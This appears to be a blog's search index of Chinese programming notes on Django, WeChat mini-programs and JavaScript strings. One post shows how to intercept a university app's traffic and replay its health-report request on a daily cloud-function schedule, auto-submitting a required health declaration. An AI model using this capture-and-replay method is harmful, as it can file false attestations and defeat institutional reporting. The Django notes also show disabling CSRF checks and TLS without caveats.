SET_DEFAULT:将外键设置为默认值。 创建一对一数据无外键的模型类，和之前相同有外键的模型类： wife &#x3D; Wife.objects.create(name&#x3D;’王夫人’,author &#x3D; author1(类属性名称绑实例))wife &#x3D; Wife.objects.create(name&#x3D;’王夫人’,author_id &#x3D; 1(类属性字段绑值)) 一对一查询 正向查询：从外键查对象 反向查询：从对象查外键 调用反向属性查询到关联的一方 一对多查询核心：正向属性(authors)和反向属性(book_set)在多表上设置外键，关联一表。 创建一对多数据：语法：Foreignkey(“一”的模型类, on_delete&#x3D;xxx(级联删除：在存在键的前提下的删除规则)) 添加数据：先添加“一”，再添加“多”。无外键的模型类，和之前相同有外键的模型类：类似上面 wife &#x3D; Wife.objects.create(name&#x3D;’王夫人’,author &#x3D; author1(类属性名称绑实例))wife &#x3D; Wife.objects.create(name&#x3D;’王夫人’,author_id &#x3D; 1(类属性字段绑值)) 查询数据：正向查询（有显性属性的）：由book查出版社：book.publisher反向查询(使用反向属性)： books &#x3D; pub1.book_set.all()或books &#x3D; Book.objects.filter(publisher&#x3D;pub1) 多对多映射核心：正向属性(authors)和反向属性(book_set)mysql中多对多需要用三张表实现Django中无需手动创建第三张表，Django自动完成 创建字段语法：属性 &#x3D; models.ManyToManyField(MyModel) 创建数据： 1.先创建Author，再关联book author1 &#x3D; Author.objects.create(name&#x3D;’1’)author2 &#x3D; Author.objects.create(name&#x3D;’2’)book1 &#x3D; author1.book_set.create(title &#x3D; ‘1’)#创建author2.book_set.add(book1)#绑定 2.先创建book,再关联author book &#x3D; Book.objects.create(title&#x3D;’p1’)author3 &#x3D; book.authors.create(name&#x3D;”3”)book.authors.add(author1) Cookies和Session会话从打开浏览器访问一个网站，到关闭浏览器结束此次访问，称之为一次会话。HTTP本身是无状态的，导致会话状态难以保持。 Cookies保存在客户端浏览器上的存储空间特点： cookies在浏览器是以键值对的形式进行存储的，键和值都是以ASCII码的形式存储的 存储的数据带有生命周期 cookies的数据是按照域隔离的，不同的域之间无法访问 cookies的内部数据会在每次访问此网站时都会携带到服务器，如果cookies过大会影响访问速度。 存储HttpResponse.set_cookie(key,value&#x3D;’’,max_age&#x3D;None,expires&#x3D;None)-key:cookie的名字-value：cookie的值-max_age：存活相对时间，秒-expires：具体过期时间当不指定max_age和expires时，关闭浏览器时此数据失效。 删除&amp;获取获取：request.COOKIES删除：request.delete_cookie(key) session会话保持-登录流程用户登录-&gt;账号密码传至后端，服务器数据库验证，正确则发放cookie-&gt;后续浏览器将自动把当前域下的cookie都发送至服务器。但浏览器存储不是十分安全，因此引入了session。 session技术实际将数据存在了服务器里，对于不同的浏览器有不同的存储空间，生成空间后，会将一个sessionID返还给浏览器，浏览器会将sessionID存储在Cookies，之后每次返还给服务器。 session是在服务器上开辟一段空间用于保留浏览器和服务器交互时的重要数据。 session初始配置： 1.INSTALLED_APPS:django.contrib.sessions 2.MIDDLEWARE: ‘django.contrib.sessions.middleware.SessionMiddleware’ session的使用：session对象是一个类似于字典的SessionStore类型的对象。 保存session的值到服务器： request.session[‘KEY’] &#x3D; VALUE 获取session的值 value &#x3D; request.session[‘KEY’] value &#x3D; request.session.get(‘KEY’,默认值) 删除session del request.session[‘KEY’] 干预session时间：settings.py里的SESSION_COOKIE_AGE指定cookies中的保存时间，默认两周SESSION_EXPIRE_AT_BROWSER_CLOSE &#x3D; True,关闭浏览器自动清除session，默认FalseSESSION的数据在Django中保存在数据库中，因此需要保证已经执行过了migrate Django session的问题： 1.django session的表是单表设计，且该表数据量不会自动清理，哪怕是已经过期。 2.可以每晚执行python manage.py clearsessions，会自动删除已经过期的session数据。 缓存定义：缓存是一类可以更快的读取数据的介质统称，也指其他可以加快数据读取的存储方式。一般用来存储临时数据，常用介质的是读取速度很快的内存。意义：视图渲染有一定成本，数据库的频繁查询过高；所以对于低频变动的页面可以考虑使用缓存技术，减少实际渲染次数；用户拿到响应的时间成本会更低。场景：1.博客列表页；2.电商商品详情页场景特点：数据变动频率较少 Django中设置缓存：(settings.py) 数据库缓存：将缓存存储在数据库中，尽管存储介质还是数据库，但把一次复杂查询的结果直接存储在表里，可避免重复进行复杂查询，提升效率。 配置方法： CACHES=&#123; 'default': &#123; 'BACKEND':'django.core.cache.backends.db.DatabaseCache',#引擎 'LOCATION':'my_cache_table',#指定用于缓存的表 'TIMEOUT':300,#缓存时间 'OPTIONS':&#123; 'MAX_ENTRIES':300,#最大存储条数 'CULL_FREQUENCY':2,#缓存条数达到最大值时，删除1/x的数据 &#125; &#125; &#125; 缓存到服务器内存中 配置方法： CACHES=&#123; default: &#123; 'BACKEND':'django.core.cache.backends.locmem.LocMemCache',#引擎 'LOCATION':'unique-snowflake',#雪花算法内存寻址 &#125; &#125; 将缓存数据存储到本地文件中 配置方法： CACHES=&#123; default: &#123; 'BACKEND':'django.core.cache.backends.filebased.FileBasedCache',#引擎 'LOCATION':'/var/tmp/django_cache',#存储路径 # win'c:\\test\\cache' &#125; &#125; 整体缓存策略 视图函数中 django还是使用了装饰器来实现缓存逻辑 from django.views.decorators.cache import cache_page @cache_page(30)# 单位秒 def my_view(request): 路由中 一个道理，在进入视图函数前首先使用装饰器。换个地方写而已。 from django.views.decorators.cache import cache_page urlpatterns = [ path('foo/',cache_page(60)(my_view)), ] 使用简单粗暴，但是无法控制。 局部缓存策略相较于整体缓存更加灵活，复用性更好。缓存api的使用： 方式1：使用caches[‘CACHE配置key’]导入具体对象 from django.core.caches import caches cache1 = caches['myalias'] cache2 = caches['myalias_2'] 方式2 直接调用CACHE中的default值。相当于1中的 cache = caches['default'] from django.core.caches import cache 缓存api： 1.cache.set(key,value,timeout)-存储缓存 key:缓存的key，字符串类型 value:python对象 timeout：缓存存储时间，默认为CACHES中的TIMEOUT值 返回值：None 2.cacahe.get(key)-获取缓存 key：缓存的key 返回值，key的对应值，没有则返回None 3.cache.add(key,value)-存储缓存，只在key不存在的时候生效 返回值：True或False 4.cache.get_or_set(key,value,timeout) 5.cache.set_many(dict,timeout) 6.cache.get_many(key_list) 7.cache.delete(key) 8.cache.delete_many(key_list) 浏览器缓存策略-强缓存不会向服务器发送请求，直接从缓存中读取资源 1.响应头-Expires：定义缓存过期时间，是服务器端的具体的时间点 样例：Expires:Thu,02 Apr 2030 05:14:08 GMT 2.响应头-Cache-Control ‘Cache-Control:max-age&#x3D;120’120秒后缓存失效 说明：目前服务器都会带着这两个头同时响应给浏览器，浏览器优先使用Cache-Control cache-page整体缓存自带强缓存功能 浏览器缓存策略-协商缓存强缓存的对象是一些静态文件、大图片等，考虑到这类资源比较费带宽且不易变化，强缓存到期后，浏览器会根服务器进行协商，当前缓存是否可用，如果可用，服务器不必返回数据，浏览器继续使用原来缓存的数据，如果文件不可用，则返回最新数据。 1.Last-Modified响应头：文件的最近修改时间，同时告诉服务器到期后协商 2.If-Modified-Since请求头，浏览器向服务器请求协商，如果资源未发生变化，则返回304（响应体为空），否则返回200代表缓存不可用（响应体为最新资源） 上述的两个头仅通过精确到秒的时间来判断缓存是否有效，不是特别精准，后来HTTP又引入了新的缓存头： 3.Etag响应头：返回当前资源的唯一标识（由服务器生成），只要资源变化，Etag就会重新生成 4.缓存到期，浏览器返回If-None-Match请求头，给服务器请求协商，服务器比对文件标识，不一致则认为资源不可用。 中间件 中间件是请求&#x2F;响应的钩子框架，用于全局改变Django的输入和输出。 中间件以类的形式体现 每个中间件负责一些特定的功能 中间件方法继承django.utils.deprecation.MiddlewareMixin类中间件类须实现下列五个方法中的一个或多个： process_request(self,request) 执行路由之前被调用，在每个请求上调用，只能返回None或HttpResponse对象，None则通过。 process_view(self,request,callback,callback_args,callback_kwargs) 在视图之前调用，在每个请求上调用，返回None或HttpResponse对象。 process_response(self,request,response) 在响应返回浏览器被调用，在每个请求调用，返回HttpResponse对象。 process_exception(self,request,exception) 当处理过程中抛出异常时调用，返回一个HttpResponse对象。用来统一抓所有视图函数的异常。 process_template_response(self,request,response) 在响应中包含render方法时被调用，该方法返回二次封装后的render响应对象。 中间件中的大部分方法返回None则表示进入下一项时间，返回HttpResponse则被拦截。 编写中间件 1.注册中间件settngs.py-MIDDLEWARE 2.建立中间件包，编写中间件’ 中间件的执行顺序先由上到下，在进入视图后变为由下至上 CSRF - 跨站伪造请求攻击利用Cookies自动提交功能，同时利用了form表单及一些html控件的跨域提交。 django的防御机制：页面和COOKIE都有一个暗号，只有两个暗号同时发送到服务器并且能够匹配，才允许POST。配置步骤： 保证django.middleware.csrf.CsrfViewMiddleware打开 模板中，form标签下添加如下标签： &#123;% csrf_token %&#125; 当个别视图不需要django进行csrf保护可以用装饰器关闭对此视图的检查 from django.views.decorators.csrf import csrf_exempt @csrf_exempt def my_view(request): return … 分页分页指在web页面有大量数据需要显示，为了阅读方便在每个页中只显示部分数据。 优点： 方便阅读 减少数据提取量，减轻服务器压力。 Django提供了Paginator类可以方便的实现分页功能Paginator类位于’django.core.paginator’模块中 paginator对象负责分页数据整体的管理 pagenator &#x3D; Paginator(object_list,per_page) object_list 需要分页数据的对象列表，如QuerySet per_page 分页数据个数 返回值：Paginator对象 Paginator对象属性 count：需要分页的数据对象总数 num_pages:分页后的页面总数 page_range：从1开始的range对象，用于记录当前页码数 per_page：每页数据个数 Paginator方法paginator对象.page(number) -参数number为页码信息(从1开始) -返回当前number页对应的页信息 -如果提供的页码不存在，抛出InvalidPage异常，包含两种异常子类-PageNotInteger页码不是整数和-EmptyPage页码超页 page对象Paginator对象的page()方法返回Page对象page &#x3D; paginator.page(页码) page对象属性： object_list：当前页上所有数据对象的列表 number:当前页面的序号，从1开始 paginator：当前page对象相关的Paginator对象 Page对象方法： has_next():如果有下一页返回True next_page_number():下一页页码，如果下一页不存在，抛出InvalidPage异常 has_previous:如果有上一页返回True previous_page_number():返回上一页的页码，如果上一页不存在，抛出InvalidPage异常。 has_other_pages：如果有上一页或者有下一页返回True csv文件 csv文件：逗号分隔值文件，其文件以纯文本形式存储表格数据（数字或文本） 说明：可被常见制表工具，如excel等直接进行读取 python中生成csv文件python提供了内建库 -csv；可直接通过该库操作csv文件。案例： import csv with open('eggs.csv','w', newline='') as csvfile:# newline指文件输出时换行符怎么处理，空字符串将不会转义 writer = csv.writer(csvfile) writer.writerow(['a','b','c']) csv文件下载在网站中实现下载csv，注意如下： 响应Content-Type类型需修改为text&#x2F;csv。这告诉浏览器该文档是CSV文件，而不是HTML文件 响应为额外添加一个Content-Disposition标头，其中包含CSV文件的名称，它将被浏览器用于开启”另存为”对话框。 import csv from django.http import HttpResponse from .models import Book def make_csv_view(request): response = HttpResponse(content_type = 'text/csv') response['Content-Disposition'] = 'attachment;filename = \"mybook.csv\"' all_book = Book.objects.all() writer = csv.writer(response) writer.writerow(['id','title']) for b in all_book: writer.writerow([b.id,b.title]) return response 内建用户系统模型类位置from django.contrib.auth.models import User（mysql中auth_user表）字段（属性）： username 用户名 password 密码 email 邮箱 first_name 名 last_name 姓 is_superuser 是否为超级用户 is_staff 是否为内部员工 is_active 伪删除 last_login 上次登陆时间 date_joined 用户创建时间 命令： 1.创建普通用户create_user,主要是需要处理密码，将自动转化密码为hash值。 from django.contrib.auth.models import User user = User.objects.create_user(username=\"用户名\",password=\"密码\",email=\"邮箱\",…) 2.创建超级用户create_superuser 3.删除用户(伪删除，更新操作) 4.校验密码 from django.contrib.auth import authenticate user = authenticate(username=username, password=password) 如果用户名密码校验成功则返回用户对象，否则返回None 5.修改密码set_password 6.登录状态保持 只存session，且时间不可控 from django.contrib.auth import login def login_view(request)： user = authenticate(username=username, password=password) login(request,user) 7.登录状态校验 from django.contrib.auth.decorators import login_required @login_required def index_view(request): login_user = request.user#直接能拿到usert对象 8.登录状态取消 from django.contrib.auth import logout def logout_view(request): logout(request) 内建用户表-扩展字段方案1:通过建立细腻哦啊，和内建表做1对1映射方案2：继承抽象user模型类方案2步骤： 1.添加应用 2.定义模型类，继承AbastractUser 3.settings.py中指明AUTH USER MODEL &#x3D; ‘应用名.类名’ ！！注意：此操作需要在第一次migrate之前进行！！ from django.db import models from django.contrib.auth.models import AbstractUser class UserInfo(Abstractuser): phone = models.CharField(max_length = 11, default = '') 在settings.py里面添加配置：AUTH_USER_MODEL &#x3D; ‘user.UserInfo’ 添加用户from user.models import UserInfo UserInfo.objects.create_user(username&#x3D;……,phone&#x3D;’’) 文件上传定义：用户可以通过浏览器将图片等文件传至网站场景： 上传头像 上传流程性的文件 上传规范-前端上传必须为POST提交方式表单’&lt;\\form&gt;’中文件上传时必须有带有enctype&#x3D;’multipart&#x2F;form-data’时才会包含文件内容数据。表单中用&lt;input type &#x3D; ‘files’ name&#x3D;’xxx’&gt;标签上传文件 上传规范-后端视图函数中，需要用request.FILES取文件框的内容file&#x3D;request.FILES[‘xxx’]说明： 1.FILES的key对应页面中file框的name值 2.file绑定文件流对象 3.file.name文件名 4.file.file文件的字节流数据 配置文件的访问路径和存储路径在settings.py中设置MEDIA相关配置，Django将用户上传的文件统称为media资源 MEDIA_URL='/media/' MEDIA_ROOT = os.path.join(BASE_DIR, 'media') 同时MEDIA_URL和MEDIA_ROOT还需要手动绑定：在主路由添加： from django.conf import settings from django.conf.urls.static import static urlpatterns += static(settings.MEDIA_URL,document_root=settings.MEDIA_ROOT) 等价于做了MEDIA_URL开头的路由，Django接到该特征请求后去MEDIA_ROOT路径查找资源 文件写入： 1.open方法 可能出现文件名称的重名问题 # 在视图函数POST中 a_file = request.FILES['myfile'] fileadd = os.path.join(settings.MEDIA_ROOT,afile.name) with open(filename,'wb') as f: data = afile.file.read() f.write(data) return HttpResponse 2.借助ORM 字段FileField(upload &#x3D; ‘子目录名’) 建表时增加一个字段即可，实际收到后直接在视图函数中将绑定文件流对象扔给对应字段即可 Content.objects.create(desc = title, content = a_file) 该方法若文件名重复则django将自动添加后缀 django发送邮件业务场景： 业务报警 邮件验证 密码找回 邮件相关协议 SMTP：Simple Mail Transfer Protocol，简单邮件传输协议（port：25） 负责邮件的发送，属于“推送”协议 IMAP：Internet Mail Access Protocol，交互式邮件访问协议，应用层协议（port：143） 负责本地邮件客户端访问远程服务器上的邮件，属于“拉取”协议 POP3：Post Office Protocol3：邮局协议第3个版本，是TCP&#x2F;IP协议族中的一员（port：110） 本协议主要用于支持使用客户端远程管理在服务器上的电子邮件，同样属于“拉取”协议。 IMAP VS POP3: 两者均为“拉取”协议，负责从邮件服务器中下载邮件 IMAP支持摘要浏览功能，并且是双向协议，客户端操作可以反馈给服务器 POP3必须下载全部邮件，且为单向协议，客户端操作无法同步服务器。 Django发邮件Django中配置邮件功能，主要为SMTP协议，负责发邮件原理： 给Django授权一个邮箱 Django用该邮箱给对应收件人发送邮件 django.core.mail封装了电子邮件的自动发送SMTP协议 授权： 邮箱端修改 开启SMTP相关的功能，获得授权码。 Django修改(settings.py添加) EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'# 引擎：写死 EMAIL_HOST = 'smtp.qq.com'# 腾讯qq邮箱的SMTP服务器地址 EMAIL_PORT = 25# 默认25 EMAIL_HOST_USER = 'xxxx@qq.com' EMAIL_HOST_PASSWORD = '*******'# 指的是授权码 EMAIL_USE_TLS = False # 与SMTP服务器通讯时，是否启动TLS连接（安全链接）默认为False，安全协议比较耗时 发送： from django.core import mail mail.send_mail( subject, message, from_email,# 发送邮箱 recipient_list = ['xxx@qq.com'],# 接受者邮箱列表 ) 返回1则成功发送 通过中间件可以捕获所有视图函数的异常，并发送到指定邮箱process_exception(self,request,exception)定位错误位置：异常追溯 import traceback traceback.format_exc()# 直接获得错误具体位置及出错信息 邮箱里可以直接发送traceback.format_exc() 自定义收件人：在settings里自定义属性，在调用send_mail位置 from django.conf import settings recipient_list = settings.自定义属性 项目部署在软件开发完毕后，将开发机器上运行的软件实际安装到服务器上进行长期运行 安装机器上安装和配置同版本的环境[py,数据库等] django项目迁移，第三方工具：finalshare等 ubuntu直接用scp命令 sudo scp 需要复制文件路径 远程ip:路径 用uWSGI替代python manage.py runserver方法 配置nginx反向代理服务器 用nginx配置静态文件路径，解决静态路径问题 uWSGIWSGI：Web Server Gateway Interface，Web服务器网关接口，是Pyhton应用程序或框架和Web服务器之间的一种接口。uWSGI：WSGI的一种，实现了http协议、WSGI协议、uwsgi协议等多种协议。在python web圈热度极高，主要以学习配置为主。 uWSGI安装pip命令可以安装[ubuntu验证安装]:sudo pip3 freeze|grep -i ‘uwsgi’[ubuntu安装]:sudo pip3 install uwsgi&#x3D;&#x3D;2.0.18 -i https://pypi.tuna.tsinghua.edu.cn/simple/ 配置uWSGI: 项目同名文件夹&#x2F;uwsgi.ini 如mysite1&#x2F;mysite1&#x2F;uwsgi.ini文件以[uwsgi]开头，有如下配置项： 1监听端口 套接字方式的IP地址：端口号[此模式需要有nginx] socket&#x3D;127.0.0.1:8000 Http通信凡是的IP地址：端口号 http&#x3D;127.0.0.1:8000 2项目当前工作目录 chdir&#x3D;绝对路径 3项目中wsgi.py文件目录，相对于当前工作目录 wsgi-file&#x3D;相对路径 4进程个数(最多为cpu核数) process&#x3D;4 5每个进程的线程个数 threads&#x3D;2 6服务的pid记录文件 pidfile&#x3D;uwsgi.pid 7服务的日志文件位置(后台启动以及所有日志位置) daemonize&#x3D;uwsgi.log 8开启主进程管理模式 master&#x3D;true"},{"title":"微信小程序云开发实现图片的上传、存储、访问","path":"/post/dc7f.html","text":"我们在进行项目开发时，经常需要处理用户上传的图片，如果用传统的后端开发，处理起来是比较繁琐的。微信小程序云开发提供了一系列API供开发者完成想要的效果。下面我们要实现用户图片的上传、存储及访问。 &lt;button type&#x3D;&quot;primary&quot; bindtap&#x3D;&quot;upImg&quot;&gt;上传图片&lt;&#x2F;button&gt; 因为只是演示功能，我们用一个按钮实现点击事件的产生。首先我们用到的第一个API就是wx.chooseImage官方文档介绍: upImg()&#123; var that &#x3D; this; wx.chooseImage(&#123; count: 1, success(res)&#123; console.log(res); &#125; &#125;) &#125;, 然后我们试着选中一个图片，然后看控制台的输出内容。这个tempFilePaths是我们需要的数据。接下来我们使用第二个API，wx.cloud.uploadFile官方文档介绍： upImg()&#123; var that &#x3D; this; wx.chooseImage(&#123; count: 1, success(res)&#123; console.log(res); wx.cloud.uploadFile(&#123; cloudPath:&#39;test&#x2F;&#39; + Math.floor(Math.random()*1000000), filePath:res.tempFilePaths[0], success(res)&#123; console.log(&quot;成功&quot;,res); &#125; &#125;) &#125; &#125;) &#125;, wx.chooseImage里面其实没有什么我们需要填写的参数，直接使用就行。但是wx.cloud.uploadFile很明显需要我们填写cloudPath和filePath，这个cloudPath其实就是我们要在云存储中存放的位置，可以新建一个文件夹，也可以直接往里堆。我是新建了一个名为test的文件夹并且在后面拼接了一个很多位的随机数，避免重复。filePath就是我们上文提到的需要的数据，即wx.chooseImage的返回值中的tempFilePaths。然后我们现在再点击一下按钮，看一下wx.cloud.uploadFile的回调会给我们返回一个什么样的值。 fileID和statusCodefileID就是在云存储中的链接，可以直接在客户端访问到。statusCode是一个状态码，可以用来判断操作是否成功。 我们现在试一下fileID能不能直接在WXML中通过Image组件访问到 &lt;image src&#x3D;&quot;cloud:&#x2F;&#x2F;creator-xcq6k.6372-creator-xcq6k-1301361703&#x2F;test&#x2F;461783&quot;&gt;&lt;&#x2F;image&gt; 没有问题，是可以直接访问的。但是这个fileID仅仅只是在客户端可以被访问到，在一些业务场景下是不够的。下面这个API可以把fileID转化为https的url地址，供全网访问。wx.cloud.getTempFileURL官方文档介绍： upImg()&#123; var that &#x3D; this; wx.chooseImage(&#123; count: 1, success(res)&#123; console.log(res); wx.cloud.uploadFile(&#123; cloudPath:&#39;test&#x2F;&#39; + Math.floor(Math.random()*1000000), filePath:res.tempFilePaths[0], success(res)&#123; console.log(&quot;成功&quot;,res); wx.cloud.getTempFileURL(&#123; fileList:[res.fileID], success(res)&#123; console.log(res); &#125; &#125;) &#125; &#125;) &#125; &#125;) &#125;, 这里的tempFileURL就是我们需要的url。复制一下，打开任意一个浏览器，粘贴到地址栏，就会弹出下载的弹窗 下载了以后，因为没有后缀名所以是无法直接打开的，可以直接在后面填上.png或者.jpg的后缀。 其实这里我推荐在当初填云存储的图片路径的时候，即cloudPath，就把图片的后缀加上，可以通过正则表达式获取真实的图片后缀，也可以人为的在后面手动拼接后缀，都没有问题。如果路径上有图片的后缀的话，其实就可以直接在网页上浏览图片了，当然也可以下载。 转载： 微信小程序云开发实现图片的上传、存储、访问"},{"title":"XTU每日打卡","path":"/post/a542.html","text":"1.抓包1.1 工具使用ANDROID端app工具：httpcanary9.2.8.1 手机下载安装后安装证书： 之后点击小蓝飞机 允许VPN 便开始抓包了 IOS端：Http Traffic Http Traffic是一款 IOS 平台下的抓包工具，可以作为代{过}{滤}理服务器局域网内设备都可以连接并且抓包，监控网络手机或者 PC 机的网络请求，分析网络数据包情况。 Http Traffic使用 charles 的原理是一样的，通过本机启动一个代{过}{滤}理服务方式抓包，实现了以 iPhone 作为服务端的功能，在同一个局域网内的设备都可以进行连接。 可以抓取网络请求头和请求体的数据，同样可以抓取响应头和响应体的数据. 局域网内可以访问 iPhone 的 http://ip:8002 链接通过浏览器来查看抓包记录,iPhone 本机可以使用http:&#x2F;&#x2F; 127.0.0.1:8002 来访问内嵌的展示网页。 下载方式,Appstore 搜索 “http traffic” 即可下载. 抓包历史记录,抓包历史存档在本机,可以随时查阅抓包的历史, 会话内的数据包列表,可以展示数据包类型,数据包大小,以及图片预览等 查看数据包的请求和响应数据情况,包括请求链接,请求头,请求行,状态,返回的数据包,响应的头信息等. 1.2 抓取湘大校园打卡数据（以android端为例，IOS类比）关闭抓包软件 打开湘大校园停留到健康信息上报界面，这里先不提交 开启抓包 上报 回到抓包软件 找到链接为 https://app.xiaoyuan.ccb.com/channelManage/outbreak/addOutbreak 的那一条数据 点击 请求 -》RAW 复制所有数据 2.python文件import requests import json def sender(): url &#x3D; &#39;https:&#x2F;&#x2F;app.xiaoyuan.ccb.com&#x2F;channelManage&#x2F;outbreak&#x2F;addOutbreak&#39; headers &#x3D; &#123; &#39;Host&#39;: &#39;app.xiaoyuan.ccb.com&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Content-Length&#39;: &#39;1208&#39;, &#39;Accept&#39;: &#39;application&#x2F;json, text&#x2F;plain, *&#x2F;*&#39;, &#x2F;&#x2F;...... 后面同理填 &#125; null&#x3D;&#39;&#39; data &#x3D; &#123;&#39;stuClass&#39;:&#39;9999&#39;,&#39;schoolId&#39;:&#39;10530&#39;,&#x2F;&#x2F;...... 后面同理填&#125; data &#x3D; json.dumps(data) res &#x3D; requests.post(url&#x3D;url,data&#x3D;data,headers&#x3D;headers) return res.text def main_handler(event, context): return sender() if __name__ &#x3D;&#x3D; &#39;__main__&#39;: sender() 注意python的格式 3.腾讯云云函数部署腾讯云函数：[官网注册并激活] 新建 名称随便，运行环境python3.6，创建方式空白函数，将写好的py代码复制进index.py，点击完成 在函数管理-函数代码中点测试， 因为上面代码会return res.text，出现下图结果说明ok，还可以去健康信息上报界面验证一下最近一次提交时间 在触发管理点创建触发器，触发周期改为自定义触发周期，名称随意，Cron表达式 0 0 6 * * * * 表示每天的六点定时执行一次，以此类推，另外不建议将时间设为凌晨时间因为可能不算 OK！ 参考文章： 湘大校园-健康信息填报自动打卡"},{"title":"微信小程序开发笔记","path":"/post/9bb.html","text":"1.跳转方式&#x2F;&#x2F;只能跳转到tabBar配置页面 wx.switchTab(&#123; url: &#39;&#x2F;pages&#x2F;index&#x2F;index&#39;, &#125;); &#x2F;&#x2F;返回上一级页面（delta：返回的页面数，如果 delta 大于现有页面数，则返回到首页，默认值为1） wx.navigateBack(&#123; delta: 2 &#125;) &#x2F;&#x2F;关闭当前页面，跳转到应用内的某个页面 wx.redirectTo(&#123; url: &#39;&#x2F;pages&#x2F;index&#x2F;index&#39;, &#125;); &#x2F;&#x2F;保留当前页面，跳转到应用内的某个页面 wx.navigateTo(&#123; url: &#39;&#x2F;pages&#x2F;index&#x2F;index&#39;, &#125;); &#x2F;&#x2F; 关闭所有页面，打开到应用内的某个页面 wx.reLaunch(&#123; url: &#39;&#x2F;pages&#x2F;index&#x2F;index&#39;, &#125;);"},{"title":"Javascript字符串处理","path":"/post/4428.html","text":"作为JavaScript基础数据类型，字符串具有一些很强大的方法，在平时的工作中用到的地方也特别的多，很多时候因为不熟悉某个字符串的方法，往往走了很多弯路，所以整理了15个常用又高效的字符串方法，来一起看看这15个提升工作效率的方法吧！ 1. 字符串去除首尾空格 —— trim()说明： 去除字符串两边的空白。 需求场景： 用户搜索前去除输入的首尾空格。 用法： string.trim() 例子： let str &#x3D; &quot; 白色不白，黑色不黑，我...我不喜欢你 &quot; let result &#x3D; str.trim() console.log(result); &#x2F;&#x2F; 控制台打印：&quot;白色不白，黑色不黑，我...我不喜欢你&quot; 复制代码 2. 字符串替换指定字符（串）—— replace()说明： 字符串替换字符还是replace()最强大~默认替换第一个符合条件的字符串，也可用正则做全局匹配 需求场景： 字符串的替换，关键词的屏蔽隐藏等 用法： string.replace(searchvalue,newvalue) 例子： let str &#x3D; &quot;你知道吗？世界上有60亿人，宇宙有60万亿小行星，你比小行星还要珍贵一万倍&quot; let result1 &#x3D; str.replace(&quot;亿&quot;,&quot;个&quot;) let result2 &#x3D; str.replace(&#x2F;亿&#x2F;g,&quot;个&quot;) console.log(result1) &#x2F;&#x2F; 控制台打印：&quot;你知道吗？世界上有60个人，宇宙有60万亿小行星，你比小行星还要珍贵一万倍&quot; console.log(result2) &#x2F;&#x2F; 控制台打印：&quot;你知道吗？世界上有60个人，宇宙有60万个小行星，你比小行星还要珍贵一万倍&quot; 复制代码 3. 字符串合并 —— concat()说明： 连接两个或更多字符串，并返回新的字符串。（悄悄告诉你，数组也可以使用哦~） 需求场景： 字符串合并展示。 用法： string.concat() 例子： let str1 &#x3D; &quot;我有很多好听的情话,&quot; let str2 &#x3D; &quot;可面对你都不敢说不出口。&quot; let result &#x3D; str1.concat(str2) console.log(result) &#x2F;&#x2F; 控制台打印：&quot;我有很多好听的情话,可面对你都不敢说不出口。&quot; 复制代码 4. 字符串转数组 —— split()说明： 把字符串通过特定字符分割为字符串数组，split还可以使用正则表达式实现拆分多个分隔符。 需求场景： 字符串转数组进行遍历等操作。 用法1： string.split() 用法2： string.split(/[*]/) 例子： let str &#x3D; &quot;张三,李四;王五&quot; let result1 &#x3D; str.split(&#39;,&#39;) let result2 &#x3D; str.split(&#x2F;[,;]&#x2F;) console.log(result1) &#x2F;&#x2F; 控制台打印：[&quot;张三&quot;, &quot;李四;王五&quot;] console.log(result2) &#x2F;&#x2F; 控制台打印：[&quot;张三&quot;, &quot;李四&quot;, &quot;王五&quot;] 复制代码 5. 字符串转数组 —— […string]说明： 说起来，这并不是字符串的方法，主要是我觉得ES6语法中的扩展操作符的…语法是转数组最简洁的方法。它和split()区别在于：...语法不根据特定字符切割，而是把每个字符都当作单独的元素添加到数组中。 需求场景： 字符串全部分割成字符数组。 用法： [...string] 例子： let str &#x3D; &#39;这是一个字符串string&#39; let arr &#x3D; [...str] console.log(arr) &#x2F;&#x2F; 控制台打印：[&quot;这&quot;, &quot;是&quot;, &quot;一&quot;, &quot;个&quot;, &quot;字&quot;, &quot;符&quot;, &quot;串&quot;, &quot;s&quot;, &quot;t&quot;, &quot;r&quot;, &quot;i&quot;, &quot;n&quot;, &quot;g&quot;] 复制代码 6. 字符串反转 —— […string].reverse().join(“”)说明： 这个也不能算是字符串方法，但是好用。本质上还是转成数组，数组反转之后，再拼接成字符串。 需求场景： 将当前字符串反转输出 用法： [...string].reverse().join(&quot;&quot;) 例子： let str &#x3D; &quot;两极反转，龙卷风摧毁停车场!&quot; let result &#x3D; [...str].reverse().join(&quot;&quot;) console.log(result) &#x2F;&#x2F; 控制台打印：!场车停毁摧风卷龙，转反极两 复制代码 7. 字符串的多次复制 —— repeat ()说明： 复制字符串指定次数，并将它们连接在一起返回。 需求场景： 字符串需要进行 n 次自动复制。 用法： string.repeat(n) 例子： let str1 &#x3D; &#39;复制&#39; let result &#x3D; str1.repeat(2) consol.log(result) &#x2F;&#x2F; 控制台打印：复制复制 let str2 &#x3D; &#39;10&#39; let result &#x3D; str2.repeat(5) console.log(result) &#x2F;&#x2F; 控制台打印：1010101010 复制代码 8. 字符串是否包含某字符 （串）—— search()说明：检索字符串中指定的或与正则表达式相匹配的首个子字符串。如果匹配到了则返回匹配字符串首字符下标，如果没有匹配到，则返回 -1。 需求场景： 字符串内关键字的搜索查询定位。 用法： string.search(searchvalue)。 例子： let str &#x3D; &quot;今天的夜色很好，月亮也很圆，唯一遗憾的是，我不是从你的窗子里看到的月亮。&quot; let result1 &#x3D; str.search(&quot;月亮&quot;) let result2 &#x3D; str.search(&#x2F;[，。]&#x2F;) console.log(result1) &#x2F;&#x2F; 控制台打印：8 console.log(result2) &#x2F;&#x2F; 控制台打印：7 复制代码 9. 字符串内是否包含某字符（串）—— includes()说明： includes()可选择从某处下标之后开始查找，返回true或false。第二个参数代表从某下标处开始查找，忽略则代表从下标0开始查找。 它和search()区别在于：search()返回指定下标， includes()返回true或false；search()不能从指定下标开始查找， includes()可以从指定下标处开始查找。 需求场景： 判断字符串中是否有不合法字符等 用法： string.includes(searchvalue, start) 例子： let str &#x3D; &quot;没有夏日的的凉风，也没有冬日的暖阳，它们只是恰好出现在了合适的时间罢了&quot; let result1 &#x3D; str.includes(&quot;冬日&quot;) let result2 &#x3D; str.includes(&quot;冬日&quot;,20) console.log(result1); &#x2F;&#x2F; 控制台打印：true console.log(result2); &#x2F;&#x2F; 控制台打印：false 复制代码 10. 字符串中指定的字符串值在首次或最后一次出现的位置 —— indexOf() 和 lastIndexOf()说明： indexOf() 方法可返回某个指定的字符串值首次出现的位置，即从前向后搜索。如果指定第二个参数 